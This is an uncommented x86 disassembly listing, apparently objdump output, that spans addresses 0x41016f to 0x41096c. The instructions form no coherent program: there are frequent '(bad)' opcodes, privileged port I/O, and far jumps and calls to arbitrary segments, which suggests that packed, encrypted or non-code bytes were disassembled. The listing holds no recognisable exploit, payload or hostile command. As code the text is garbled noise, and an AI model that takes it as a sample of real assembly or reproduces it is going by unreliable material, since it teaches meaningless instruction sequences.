  41016f:	add    DWORD PTR [edx-0x7b482514],0xffffff98
  410176:	mov    ebp,DWORD PTR [edi]
  410178:	or     al,0xa5
  41017a:	inc    edi
  41017b:	ss (bad) 
  41017d:	mov    ?,WORD PTR [edx+0x5b84bac5]
  410183:	fcom   DWORD PTR [ecx-0x43]
  410186:	imul   ecx,DWORD PTR [ebp-0x17],0x53eeadf3
  41018d:	lock sti 
  41018f:	jbe    0x41017c
  410191:	jg     0x4101d5
  410193:	push   0xf
  410195:	fs push edx
  410197:	inc    bh
  410199:	dec    edi
  41019a:	mov    ecx,0xc881d582
  41019f:	mov    ah,0xf7
  4101a1:	inc    ecx
  4101a2:	xchg   edi,eax
  4101a3:	pop    ebx
  4101a4:	pushf  
  4101a5:	stos   DWORD PTR es:[edi],eax
  4101a6:	and    DWORD PTR [edx-0x4fcbf0c1],edx
  4101ac:	adc    bl,BYTE PTR [edi+edi*2+0x4e]
  4101b0:	jg     0x410216
  4101b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101b3:	test   eax,0x4f22575
  4101b8:	cmp    ecx,edx
  4101ba:	fiadd  WORD PTR [edi+ebx*8-0x70226aa5]
  4101c1:	pop    ebx
  4101c2:	scas   eax,DWORD PTR es:[edi]
  4101c3:	in     al,dx
  4101c4:	iret   
  4101c5:	cs jno 0x410195
  4101c8:	aad    0x5d
  4101ca:	bound  ebx,QWORD PTR [ebx+ebx*1-0x9841893]
  4101d1:	mov    ch,0xf1
  4101d3:	dec    esp
  4101d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d5:	sbb    al,0x82
  4101d7:	out    0x59,eax
  4101d9:	sti    
  4101da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101db:	imul   esp,DWORD PTR [esi+edi*4-0x3c],0xb
  4101e0:	in     al,dx
  4101e1:	inc    esi
  4101e2:	(bad)  
  4101e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101e4:	in     eax,dx
  4101e5:	sti    
  4101e6:	sub    al,0xad
  4101e8:	push   ebx
  4101e9:	xchg   ebx,eax
  4101ea:	imul   ebx,DWORD PTR [edi],0xd93f218e
  4101f0:	push   ebx
  4101f1:	mov    ds,WORD PTR [ecx]
  4101f3:	scas   eax,DWORD PTR es:[edi]
  4101f4:	ret    0xd4dc
  4101f7:	push   edi
  4101f8:	sti    
  4101f9:	pop    ds
  4101fa:	aam    0x20
  4101fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101fd:	bound  esp,QWORD PTR [eax+0x47e8da6]
  410203:	xchg   esi,eax
  410204:	sbb    bh,BYTE PTR [bx+0x16]
  410208:	in     al,dx
  410209:	inc    esp
  41020a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41020b:	push   0x3
  41020d:	je     0x410267
  41020f:	cli    
  410210:	pop    ss
  410211:	scas   al,BYTE PTR es:[edi]
  410212:	iret   
  410213:	pop    ss
  410214:	dec    ecx
  410215:	cmp    al,0xbc
  410217:	lds    ecx,FWORD PTR [esi-0x2d5fbc51]
  41021d:	mov    ebx,0x9bb7ac3
  410222:	xchg   edi,eax
  410223:	sub    eax,0x49fa256b
  410228:	mov    ds,WORD PTR [eax+ebx*4-0x7d7123bb]
  41022f:	push   0xffffffc1
  410231:	loopne 0x4101ba
  410233:	sbb    DWORD PTR [edi-0x74],esi
  410236:	pop    ds
  410237:	jp     0x410290
  410239:	ins    DWORD PTR es:[edi],dx
  41023a:	daa    
  41023b:	adc    dh,BYTE PTR [eax*4-0x3fa71531]
  410242:	cmp    edi,edx
  410244:	jo     0x4102a4
  410246:	call   0x93a9:0xea5a4395
  41024d:	push   eax
  41024e:	stos   BYTE PTR es:[edi],al
  41024f:	popf   
  410250:	shr    DWORD PTR [ebx-0x657eac90],0xed
  410257:	pop    esi
  410258:	cli    
  410259:	mov    cl,0x95
  41025b:	pop    edi
  41025c:	and    eax,0xaa50de3a
  410261:	test   eax,0x7be72e40
  410266:	jno    0x41027c
  410268:	call   0xfb60c9b1
  41026d:	in     al,dx
  41026e:	sahf   
  41026f:	(bad)  
  410270:	xor    DWORD PTR [edi+0x49],ecx
  410273:	(bad)  
  410274:	cli    
  410275:	add    eax,0xa49d8b67
  41027a:	imul   esi,DWORD PTR [esi-0x27],0x3b17a27c
  410281:	xchg   ebp,eax
  410282:	in     al,0x6
  410284:	mov    dh,0x28
  410286:	arpl   WORD PTR [esi],cx
  410288:	arpl   WORD PTR [edx-0x6bea0ab3],cx
  41028e:	xchg   esp,eax
  41028f:	std    
  410290:	cli    
  410291:	dec    edx
  410292:	pop    ecx
  410293:	mov    ch,0x9e
  410295:	sti    
  410296:	pop    ebp
  410297:	and    al,0xcc
  410299:	mov    ah,0x47
  41029b:	loop   0x41030f
  41029d:	push   ss
  41029e:	not    BYTE PTR [ecx+0x75aef841]
  4102a4:	sbb    edx,DWORD PTR [ebx]
  4102a6:	cmp    DWORD PTR ds:0x17e5f56b,0x7f0f921c
  4102b0:	lea    ebx,ds:0x46e32955
  4102b7:	dec    esi
  4102b8:	cmp    al,0x93
  4102ba:	(bad)  
  4102bb:	add    al,0xd2
  4102bd:	jecxz  0x41025f
  4102bf:	mov    DWORD PTR [esi*8+0x24fe06f1],ecx
  4102c6:	fwait
  4102c7:	loope  0x410258
  4102c9:	clc    
  4102ca:	add    al,0x5b
  4102cd:	cmp    al,0xff
  4102cf:	shl    DWORD PTR [eax+edi*2],1
  4102d2:	fndisi(8087 only) 
  4102d4:	in     eax,0x5f
  4102d6:	scas   eax,DWORD PTR es:[edi]
  4102d7:	dec    ebp
  4102d8:	xor    eax,0x120fb216
  4102dd:	mov    dl,0xbc
  4102df:	sbb    cl,BYTE PTR [edi-0x928e559]
  4102e5:	mov    ds:0x7b934398,al
  4102ea:	pop    es
  4102eb:	psubd  mm6,QWORD PTR [ebp+ebx*2-0x4acc46a8]
  4102f3:	sub    al,dl
  4102f5:	mov    al,0x7d
  4102f7:	mov    esi,0xe7761be
  4102fc:	or     BYTE PTR [edi],dh
  4102fe:	pushf  
  4102ff:	jo     0x410362
  410301:	pop    eax
  410302:	pop    eax
  410303:	(bad)  [edi]
  410305:	mov    ebp,0xcc46c91
  41030a:	ret    
  41030b:	(bad)
  41030e:	fisubr WORD PTR [ebp+eax*2-0x55b09661]
  410315:	adc    BYTE PTR [edx+0x43f202fe],bh
  41031b:	pushf  
  41031c:	retf   0xefa0
  41031f:	push   esp
  410320:	mov    BYTE PTR [edi+ecx*1+0x3],ah
  410324:	sub    bl,BYTE PTR [ebx]
  410326:	inc    ebx
  410327:	push   es
  410328:	ds mov ebx,0x39c65377
  41032e:	dec    ebp
  41032f:	jbe    0x410335
  410331:	popa   
  410332:	xor    DWORD PTR [ecx],0x4b
  410335:	mov    ds:0xb98cb653,eax
  41033a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41033b:	int    0x4e
  41033d:	jmp    0x41033c
  41033f:	std    
  410340:	pop    ss
  410341:	jmp    0x410318
  410343:	fcomi  st,st(1)
  410345:	(bad)  
  410347:	or     DWORD PTR [ebx],0x51
  41034a:	pop    ecx
  41034b:	xor    esi,DWORD PTR [esi+0x50247422]
  410351:	cmp    eax,0x3e5dd244
  410356:	and    ch,BYTE PTR [ebp+esi*2+0x941f9a5]
  41035d:	xchg   esp,eax
  41035e:	push   edx
  41035f:	in     eax,dx
  410360:	mov    DWORD PTR [esi+edx*1+0x6fe2fb99],ebx
  410367:	inc    esi
  410368:	xchg   DWORD PTR [ebp-0x6fa8bf1b],ecx
  41036e:	jle    0x410315
  410370:	cmc    
  410371:	xchg   esp,eax
  410372:	ins    DWORD PTR es:[edi],dx
  410373:	fcomp  DWORD PTR [edi]
  410375:	add    eax,0x8beda5e
  41037a:	les    esi,FWORD PTR [esp+eax*8+0x0]
  41037e:	add    DWORD PTR [ebp-0x5f9c66c1],0x956bbce7
  410388:	rol    BYTE PTR ds:0x620fcfde,cl
  41038e:	fstp   DWORD PTR [esi+esi*4]
  410391:	repnz test DWORD PTR [esi-0x4b0d21ee],ebp
  410398:	xchg   esi,eax
  410399:	imul   edx,DWORD PTR [eax-0x72],0xd7da38d
  4103a0:	retf   
  4103a1:	cmp    DWORD PTR [esi],ebx
  4103a3:	inc    edi
  4103a4:	push   eax
  4103a5:	pop    ds
  4103a6:	in     al,dx
  4103a7:	shl    DWORD PTR [edx+edi*4+0x3f],0x75
  4103ac:	(bad)  
  4103ad:	mov    eax,0x21397167
  4103b2:	cdq    
  4103b3:	sar    BYTE PTR ds:0x3c1a7f17,1
  4103b9:	test   eax,0x2781745e
  4103be:	in     eax,0x58
  4103c0:	mov    DWORD PTR [eax-0x5d],ebx
  4103c3:	xlat   BYTE PTR ds:[ebx]
  4103c4:	cld    
  4103c5:	sbb    eax,DWORD PTR [esi]
  4103c7:	in     eax,dx
  4103c8:	enter  0x2de0,0x78
  4103cc:	dec    ebx
  4103cd:	mov    ecx,0x1776c5c5
  4103d2:	(bad)  
  4103d4:	jnp    0x41038e
  4103d6:	out    0x6e,al
  4103d8:	jae    0x41044e
  4103da:	jmp    0x7505:0xfe9026e7
  4103e1:	clc    
  4103e2:	or     al,0x90
  4103e4:	rcr    DWORD PTR [eax+0x4f6d4679],cl
  4103ea:	cmp    esp,edi
  4103ec:	pop    edx
  4103ed:	mov    edx,0xd889f725
  4103f2:	mov    ds:0x73813bba,al
  4103f7:	add    DWORD PTR [ebx+0x68],esp
  4103fa:	dec    ecx
  4103fb:	mov    ch,0xb3
  4103fd:	add    edx,edx
  4103ff:	push   cs
  410400:	or     esp,ecx
  410402:	sbb    BYTE PTR [edx+0x33],ch
  410405:	jae    0x410464
  410407:	sqrtps xmm5,xmm3
  41040a:	dec    BYTE PTR [ebx*4-0x43b64873]
  410411:	dec    eax
  410412:	pop    esi
  410413:	xor    ebp,0x2
  410416:	or     ebp,DWORD PTR [eax+ecx*2-0x5e]
  41041a:	mov    eax,ds:0x56ddb4cc
  41041f:	sahf   
  410420:	das    
  410421:	mov    edi,0x45030412
  410426:	mov    ah,0x7c
  410428:	jmp    0x4103c0
  41042a:	cmc    
  41042b:	push   esp
  41042c:	push   eax
  41042d:	mov    dl,0x28
  41042f:	lods   eax,DWORD PTR ds:[esi]
  410430:	or     al,0x2e
  410432:	mul    esp
  410434:	jl     0x4103e1
  410436:	sub    BYTE PTR [ebp+0x6133b536],dh
  41043c:	xchg   DWORD PTR [edx+edx*2-0x72166464],ebp
  410443:	mov    dh,0x5a
  410445:	iret   
  410446:	dec    edi
  410447:	out    dx,al
  410448:	adc    al,0x24
  41044a:	hlt    
  41044b:	xor    esp,DWORD PTR [eax-0x4a716a75]
  410451:	xor    BYTE PTR [ecx-0x7b],dl
  410454:	jle    0x41041a
  410456:	and    ecx,DWORD PTR ds:[edx-0x1dcb8192]
  41045d:	mov    esp,0x1383ec76
  410462:	in     eax,0x45
  410464:	popa   
  410465:	cmp    ebx,esp
  410467:	imul   ebp,DWORD PTR [eax],0xffffffc5
  41046a:	jle    0x4104b1
  41046c:	cmp    al,0x11
  41046e:	mov    ds:0x5062079c,al
  410473:	or     esi,DWORD PTR [ebx+esi*1]
  410476:	cmp    ecx,ebp
  410478:	pop    es
  410479:	jmp    0x3faf:0x37e13a20
  410480:	dec    esi
  410481:	fsubrp st(0),st
  410483:	adc    al,0xc5
  410485:	cmp    eax,0x359468b8
  41048a:	jmp    0x4104f3
  41048c:	out    dx,al
  41048d:	push   edx
  41048e:	push   ss
  41048f:	xchg   edx,eax
  410490:	(bad)  
  410491:	aad    0xef
  410493:	(bad)  
  410494:	cli    
  410495:	jbe    0x41041e
  410497:	adc    ecx,ecx
  410499:	stc    
  41049a:	and    BYTE PTR [eax-0x26],dh
  41049d:	adc    eax,0x32969aee
  4104a2:	sbb    al,0x71
  4104a4:	pushf  
  4104a5:	jae    0x410480
  4104a7:	aas    
  4104a8:	inc    esp
  4104a9:	inc    esp
  4104aa:	sbb    al,0x20
  4104ac:	mov    ebp,0xdcdfdaa0
  4104b1:	cwde   
  4104b2:	dec    ebx
  4104b3:	les    ecx,FWORD PTR [ecx+0x7c28f03]
  4104b9:	sbb    BYTE PTR [ebp-0x11],ah
  4104bc:	in     eax,dx
  4104bd:	lods   al,BYTE PTR ds:[esi]
  4104be:	sbb    DWORD PTR [ebx-0xb],0xb61b680a
  4104c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c6:	mov    dl,BYTE PTR [ebx-0x473d5a4e]
  4104cc:	std    
  4104cd:	test   BYTE PTR [edx+0x66],dh
  4104d0:	dec    esi
  4104d1:	inc    eax
  4104d2:	adc    eax,0x65fbdbe1
  4104d7:	jg     0x410507
  4104d9:	mov    ds:0x605a6377,eax
  4104de:	sbb    BYTE PTR [edx+0x6f72f558],bl
  4104e4:	in     eax,dx
  4104e5:	and    eax,0x46715787
  4104ea:	sti    
  4104eb:	call   0x39b0fae2
  4104f0:	and    esi,DWORD PTR [edi]
  4104f2:	loop   0x4104a4
  4104f4:	(bad)  
  4104f5:	std    
  4104f6:	add    bh,0xbe
  4104f9:	jle    0x41049a
  4104fb:	and    BYTE PTR [edx-0x322c3454],0x22
  410502:	and    edi,DWORD PTR [edx+esi*2]
  410505:	add    eax,ecx
  410507:	enter  0xcc3e,0xaa
  41050b:	and    bl,BYTE PTR [eax]
  41050d:	mov    ebx,0x45d1a629
  410512:	jb     0x41052f
  410514:	xchg   cl,cl
  410516:	lock xchg bl,dh
  410519:	das    
  41051a:	jp     0x41052b
  41051c:	xchg   ecx,eax
  41051d:	push   edi
  41051e:	fld    QWORD PTR [ebx]
  410520:	mov    ecx,0x100a85d3
  410525:	mov    cl,0xfc
  410527:	mov    al,ds:0x7ef6cd36
  41052c:	dec    esi
  41052d:	nop
  41052e:	arpl   WORD PTR [ebx-0x78f083d8],cx
  410534:	ds popa 
  410536:	fwait
  410537:	out    dx,eax
  410538:	cld    
  410539:	call   0x7c77e89d
  41053e:	lahf   
  41053f:	jmp    0x4104db
  410541:	loope  0x410510
  410543:	mov    ah,0x6d
  410545:	xor    DWORD PTR [eax+ebx*8],esp
  410548:	jns    0x41057b
  41054a:	sub    al,0x8d
  41054c:	mov    WORD PTR [esi-0x5cd8ccbe],fs
  410552:	add    eax,0x5de2097
  410557:	fmul   DWORD PTR [edi+ebp*1+0x4515721d]
  41055e:	xchg   esi,eax
  41055f:	xor    eax,0x840d0a4
  410564:	outs   dx,BYTE PTR ds:[esi]
  410565:	les    edx,FWORD PTR [esi-0x107394b8]
  41056b:	rcpps  xmm0,XMMWORD PTR [edi+0x2f]
  41056f:	sub    BYTE PTR [ebx+edx*1-0x1c6fb95b],ch
  410576:	cmp    bl,dh
  410578:	test   al,0xa9
  41057a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41057b:	mov    dl,0x37
  41057d:	pop    esi
  41057e:	fcmove st,st(1)
  410580:	dec    esp
  410581:	popa   
  410582:	push   ecx
  410583:	adc    ecx,DWORD PTR [ecx+eax*2+0x7ddfec74]
  41058a:	stos   BYTE PTR es:[edi],al
  41058b:	pop    ds
  41058c:	mov    eax,ds:0x49e90b1b
  410591:	popa   
  410592:	test   eax,0xa254f9e6
  410597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410599:	dec    edx
  41059a:	out    dx,al
  41059b:	std    
  41059c:	cld    
  41059d:	pusha  
  41059e:	push   esi
  41059f:	push   esp
  4105a0:	xor    ebp,esp
  4105a2:	pop    ebp
  4105a3:	add    ecx,DWORD PTR [edx-0x67e651d5]
  4105a9:	ret    
  4105aa:	jmp    0x713e:0xed3458a3
  4105b1:	cmp    bh,bh
  4105b3:	add    eax,0x1c4332fc
  4105b8:	(bad)  
  4105b9:	ret    
  4105ba:	mov    DWORD PTR [ebp+0x7a4e5e32],esi
  4105c0:	fwait
  4105c1:	and    cl,BYTE PTR [eax-0xd]
  4105c4:	xchg   ecx,eax
  4105c5:	push   ds
  4105c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c7:	cwde   
  4105c8:	lds    ebp,FWORD PTR [eax+esi*1]
  4105cb:	xchg   ecx,eax
  4105cc:	ror    DWORD PTR [esi+0x177f5247],cl
  4105d2:	in     al,dx
  4105d3:	add    al,0x1b
  4105d5:	mov    ds:0xc814ab02,eax
  4105da:	xchg   esi,eax
  4105db:	and    eax,0x7d60cb1a
  4105e0:	shl    BYTE PTR [eax+0x5ccba15e],0x40
  4105e7:	jmp    0x43c2e68c
  4105ec:	clc    
  4105ed:	rcl    DWORD PTR [ecx+0x1b9e6651],1
  4105f3:	cmp    BYTE PTR [edx-0x4f],ch
  4105f6:	out    dx,al
  4105f7:	loopne 0x4105fd
  4105f9:	or     edi,DWORD PTR [esi-0x7d3f58b7]
  4105ff:	fcom   DWORD PTR [ebx+0x261fb05f]
  410605:	mov    ebx,0xc5383b48
  41060a:	xor    DWORD PTR [ecx],edi
  41060c:	inc    ecx
  41060d:	and    ch,ah
  41060f:	sbb    ebx,DWORD PTR [ebp-0x78]
  410612:	push   ds
  410613:	test   BYTE PTR [esi-0x13],bh
  410616:	loopne 0x4105c6
  410618:	mov    eax,0x9c9b4922
  41061d:	das    
  41061e:	push   ecx
  41061f:	lods   eax,DWORD PTR cs:[esi]
  410621:	lods   al,BYTE PTR ds:[esi]
  410622:	xchg   edx,eax
  410623:	inc    eax
  410624:	pushf  
  410625:	jecxz  0x4105e7
  410627:	in     al,dx
  410628:	mov    cl,0x69
  41062a:	or     eax,0xf92b6fc
  41062f:	lock cs sub eax,0x89cf00f0
  410636:	sbb    DWORD PTR [eax],ecx
  410638:	mov    ebp,0xb743d150
  41063d:	dec    esi
  41063e:	pop    ecx
  41063f:	xchg   edi,eax
  410640:	xor    al,0x25
  410642:	ins    BYTE PTR es:[edi],dx
  410643:	rol    DWORD PTR [ebx+esi*2+0x6e],1
  410647:	cdq    
  410648:	jne    0x410685
  41064a:	(bad)
  41064d:	(bad)  
  41064e:	pop    esi
  41064f:	mov    ebp,0xba7749a5
  410654:	mov    bl,0x28
  410656:	(bad)  
  410657:	lods   eax,DWORD PTR ds:[esi]
  410658:	aam    0x53
  41065a:	loop   0x4106a3
  41065c:	xchg   edx,eax
  41065d:	lods   eax,DWORD PTR ds:[esi]
  41065e:	dec    edi
  41065f:	and    DWORD PTR [edi],esi
  410661:	lea    ecx,[ecx+edi*1]
  410664:	jne    0x410667
  410666:	outs   dx,DWORD PTR ds:[esi]
  410667:	mov    eax,ds:0xba2e3ddb
  41066c:	out    0x14,eax
  41066e:	jmp    0xe048:0xa43d4d32
  410675:	clc    
  410676:	mov    dh,0xa
  410678:	ins    BYTE PTR es:[edi],dx
  410679:	cmp    eax,0xfca5c478
  41067e:	sbb    BYTE PTR [esi+0x77],al
  410681:	fs lahf 
  410683:	ret    
  410684:	mov    dl,0xd
  410686:	nop
  410687:	sub    dl,al
  410689:	add    BYTE PTR [edi+0x6a],cl
  41068c:	int    0x7f
  41068e:	xor    al,0x9e
  410690:	scas   al,BYTE PTR es:[edi]
  410691:	xchg   ebp,eax
  410692:	mov    cl,0x9
  410694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410695:	mov    al,ds:0x75ff6c32
  41069a:	imul   ecx,DWORD PTR [eax],0xffffffec
  41069d:	les    ecx,FWORD PTR [ebx-0x38]
  4106a0:	mov    edi,0x6d5440bf
  4106a5:	sub    ch,BYTE PTR [ebp+0x2d3167c5]
  4106ab:	pop    eax
  4106ac:	cwde   
  4106ad:	jo     0x41068a
  4106af:	fstp   DWORD PTR [edx]
  4106b1:	dec    ecx
  4106b2:	push   cs
  4106b3:	in     al,0x71
  4106b5:	pop    edi
  4106b6:	je     0x4106df
  4106b8:	ror    ch,cl
  4106ba:	ret    0xa5bc
  4106bd:	popf   
  4106be:	or     ecx,ebp
  4106c0:	out    dx,al
  4106c1:	into   
  4106c2:	and    eax,0x73c1ed25
  4106c7:	sar    BYTE PTR [esi-0x1d432d1b],cl
  4106cd:	clc    
  4106ce:	mov    edx,DWORD PTR [ecx]
  4106d0:	jle    0x4106c1
  4106d2:	ds loopne 0x410682
  4106d5:	add    bh,BYTE PTR [esi+0x6d1ae6b8]
  4106db:	pop    ecx
  4106dc:	in     al,0x52
  4106de:	pushf  
  4106df:	dec    ebx
  4106e0:	icebp  
  4106e1:	pop    ebx
  4106e2:	inc    edx
  4106e3:	adc    dl,BYTE PTR ss:[ebp-0x6ae9856f]
  4106ea:	mov    ?,WORD PTR [ecx]
  4106ec:	pop    ds
  4106ed:	sub    al,0x9e
  4106ef:	je     0x410694
  4106f1:	(bad)  
  4106f2:	(bad)  
  4106f3:	retf   0x6c3f
  4106f6:	jl     0x4106b9
  4106f8:	jae    0x4106c0
  4106fa:	aaa    
  4106fb:	rol    BYTE PTR [eax-0x6c],1
  4106fe:	dec    ebp
  4106ff:	xchg   esp,eax
  410700:	jbe    0x41077b
  410702:	mov    BYTE PTR [esi+edi*4],cl
  410705:	leave  
  410706:	repz jno 0x4106c0
  410709:	pop    edi
  41070a:	js     0x4106ec
  41070c:	jne    0x410776
  41070e:	std    
  41070f:	ss (bad) 
  410711:	jnp    0x410759
  410713:	pop    ebx
  410714:	or     eax,0x1f55a8a9
  410719:	or     eax,0x7587a19d
  41071e:	jbe    0x4106fe
  410720:	mov    ebx,0xe82b603b
  410725:	cmp    al,BYTE PTR [ecx-0x3fbe4af0]
  41072b:	dec    edi
  41072c:	mov    dh,0x45
  41072e:	mov    ds:0xbaacf5e2,al
  410733:	xor    BYTE PTR [edx+0x5c],bl
  410736:	and    eax,0xfe06e063
  41073b:	das    
  41073c:	mov    ebx,0x40cf1feb
  410741:	rcr    eax,0x41
  410744:	xor    al,al
  410746:	repnz (bad) 
  410748:	je     0x410714
  41074a:	fstp   QWORD PTR [edi+0x7c0aa9ea]
  410750:	daa    
  410751:	fsubp  st(7),st
  410753:	add    ecx,edi
  410755:	cmp    eax,0xfb666632
  41075a:	jmp    0x72261a7d
  41075f:	test   al,0x4
  410761:	stos   BYTE PTR es:[edi],al
  410762:	adc    DWORD PTR ds:0xa49721d7,esp
  410768:	arpl   WORD PTR [ebx],di
  41076a:	sbb    edi,DWORD PTR [ebp-0x80]
  41076d:	xchg   ebp,eax
  41076e:	stos   DWORD PTR es:[edi],eax
  41076f:	add    ecx,DWORD PTR [ebx]
  410771:	push   ecx
  410772:	xchg   edi,eax
  410773:	jae    0x4107ed
  410775:	push   0xffffffbb
  410777:	dec    esi
  410778:	outs   dx,DWORD PTR ds:[esi]
  410779:	or     DWORD PTR [eax],eax
  41077b:	das    
  41077c:	call   0xf8b3:0xab1a9265
  410783:	mov    eax,ds:0x59f070a
  410788:	(bad)  
  410789:	sahf   
  41078a:	and    esi,DWORD PTR [ebx]
  41078c:	ins    BYTE PTR es:[edi],dx
  41078d:	cmp    eax,0xa74a8f42
  410792:	in     al,dx
  410793:	mov    esp,0xd5fe220c
  410798:	and    ch,dl
  41079a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41079c:	out    dx,eax
  41079d:	gs mov dl,0x5c
  4107a0:	iret   
  4107a1:	or     eax,0xf2b11298
  4107a6:	out    0xf8,al
  4107a8:	nop
  4107a9:	pop    ds
  4107aa:	cs hlt 
  4107ac:	sbb    bl,BYTE PTR [ebp+0x2893d3ce]
  4107b2:	arpl   WORD PTR [eax-0x70620b0e],bp
  4107b8:	mov    cl,0xa7
  4107ba:	das    
  4107bb:	xlat   BYTE PTR ds:[ebx]
  4107bc:	call   0x1ea016bb
  4107c1:	pop    eax
  4107c2:	sahf   
  4107c3:	inc    ebp
  4107c4:	ja     0x410768
  4107c6:	ret    
  4107c7:	mov    al,ds:0x47e5d612
  4107cc:	aam    0xac
  4107ce:	jmp    0x6336:0xff5dfb39
  4107d5:	ins    DWORD PTR es:[edi],dx
  4107d6:	add    BYTE PTR [eax+0x7a792226],al
  4107dc:	std    
  4107dd:	cld    
  4107de:	stos   DWORD PTR es:[edi],eax
  4107df:	mov    WORD PTR [edx-0x28],gs
  4107e2:	push   edi
  4107e3:	and    ch,BYTE PTR [eax+0x74df4a5c]
  4107e9:	dec    DWORD PTR [eax]
  4107eb:	add    eax,0xd4ae3544
  4107f0:	call   0xc2355f12
  4107f5:	mov    ds:0xfb198ef2,eax
  4107fa:	test   DWORD PTR [ebx+0x2ced860e],ecx
  410800:	mov    esi,0x429bdeee
  410805:	inc    eax
  410806:	daa    
  410807:	test   al,0xc3
  410809:	(bad)  
  41080b:	fwait
  41080c:	mov    esp,0xe205fc22
  410811:	je     0x4107cc
  410813:	xchg   esp,eax
  410814:	and    ebx,DWORD PTR [eax-0x5899ca0a]
  41081a:	cwde   
  41081b:	test   DWORD PTR [eax+eax*4-0x20],esp
  41081f:	hlt    
  410820:	push   cs
  410821:	retf   
  410822:	xchg   ebp,eax
  410823:	stos   DWORD PTR es:[edi],eax
  410824:	sbb    esp,0x4cd5a07a
  41082a:	lahf   
  41082b:	inc    edi
  41082c:	mov    esp,0x68eabd9c
  410831:	ret    0xc30c
  410834:	les    esi,FWORD PTR [edx-0x1e]
  410837:	lahf   
  410838:	cmp    eax,0xdcb2b0b3
  41083d:	pop    esp
  41083e:	out    0x12,al
  410840:	imul   esp,DWORD PTR [ecx+0x4224803a],0xe792071f
  41084a:	dec    ebx
  41084b:	(bad)  
  41084d:	push   es
  41084e:	data16 and al,BYTE PTR [eax]
  410851:	push   es
  410852:	jno    0x4108ac
  410854:	call   0xeb20fc5a
  410859:	pop    ebp
  41085a:	jnp    0x410898
  41085c:	not    DWORD PTR [ecx+0xa]
  41085f:	pop    esp
  410860:	cmp    al,0x40
  410862:	imul   eax
  410864:	jmp    0x4107f9
  410866:	das    
  410867:	fnop   
  410869:	mov    DWORD PTR [esi+ebp*1],edi
  41086c:	push   ecx
  41086d:	mov    ah,0xff
  41086f:	loopne 0x4108c8
  410871:	(bad)  
  410872:	int3   
  410873:	and    ecx,DWORD PTR [esi+0xb]
  410876:	push   0xb9565a28
  41087b:	mov    ah,0xe0
  41087d:	aam    0xa5
  41087f:	jne    0x410871
  410881:	cld    
  410882:	push   ss
  410883:	sbb    eax,0xaf9fa306
  410888:	outs   dx,BYTE PTR ds:[esi]
  410889:	js     0x4108a5
  41088b:	arpl   WORD PTR [ebx-0x673e2aae],si
  410891:	jmp    0x410826
  410893:	adc    ah,BYTE PTR ds:0x18842cdb
  410899:	ja     0x41087e
  41089b:	add    esi,DWORD PTR [ebx-0xd6df3c9]
  4108a1:	dec    edx
  4108a2:	and    ch,cl
  4108a4:	mov    edx,0x4537a0f1
  4108a9:	jmp    0x66984a97
  4108ae:	cli    
  4108af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b0:	adc    esi,esi
  4108b2:	fs dec esp
  4108b4:	cmp    eax,0x796ba678
  4108b9:	ins    DWORD PTR es:[edi],dx
  4108ba:	out    dx,al
  4108bb:	rcr    DWORD PTR [ebx],1
  4108bd:	(bad)  
  4108be:	dec    ebp
  4108bf:	vpsubusw xmm3,xmm3,XMMWORD PTR [eax]
  4108c3:	fnstenv ds:0x853e2b4b
  4108c9:	sub    eax,0xe6bf492a
  4108ce:	dec    ebx
  4108cf:	inc    ecx
  4108d0:	push   ss
  4108d1:	lds    ecx,FWORD PTR [eax-0x6f25da2d]
  4108d7:	jb     0x4108a0
  4108d9:	adc    dl,BYTE PTR [edi]
  4108db:	xor    eax,0x8846dd07
  4108e0:	(bad)  
  4108e1:	dec    ebp
  4108e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e3:	mov    ds:0xc410c5e8,al
  4108e8:	and    DWORD PTR [ebx+0x716ddd38],esp
  4108ee:	sub    edx,DWORD PTR [ebx]
  4108f0:	push   0xc2e50d65
  4108f5:	push   0x85bdff77
  4108fa:	gs cld 
  4108fc:	cwde   
  4108fd:	int    0xee
  4108ff:	bound  ebp,QWORD PTR [edi*2-0x2e03348b]
  410906:	pop    ds
  410907:	mov    ch,BYTE PTR [eax]
  410909:	(bad)  
  41090a:	ins    BYTE PTR es:[edi],dx
  41090b:	sub    DWORD PTR [ebx-0xa],eax
  41090e:	xor    dh,BYTE PTR [ecx]
  410910:	push   ss
  410911:	mov    eax,0x299e0dc0
  410916:	(bad)  
  410917:	ds retf 0x4863
  41091b:	or     esp,esi
  41091d:	jnp    0x4108c4
  41091f:	test   al,0x3d
  410921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410922:	or     DWORD PTR ds:0xf9dfd9a6,edx
  410928:	pushf  
  410929:	lea    esp,[esi-0x629d6303]
  41092f:	test   al,0x91
  410931:	jne    0x4108d4
  410933:	cwde   
  410934:	(bad)  
  410935:	scas   al,BYTE PTR es:[edi]
  410936:	pusha  
  410937:	out    0xf0,eax
  410939:	mov    ds:0x5c3b5802,eax
  41093e:	sub    edi,DWORD PTR [ebx+0x29]
  410941:	fcomp  QWORD PTR [ebp-0x75]
  410944:	mov    DWORD PTR [edi+0x7c],0x9bc36b95
  41094b:	and    edi,DWORD PTR [ecx+ebx*1-0x30]
  41094f:	outs   dx,DWORD PTR ds:[esi]
  410950:	pop    esp
  410951:	pop    eax
  410952:	test   al,0x96
  410954:	stc    
  410955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410956:	hlt    
  410957:	and    cl,al
  410959:	dec    ebp
  41095a:	idiv   al
  41095c:	inc    edx
  41095d:	pminsw mm2,mm4
  410960:	fwait
  410961:	in     al,dx
  410962:	rol    BYTE PTR [ebp-0x4b],1
  410965:	or     DWORD PTR [edx-0x11],0xbe4e8f83
  41096c:	scas   eax,DWORD PTR es:[edi]
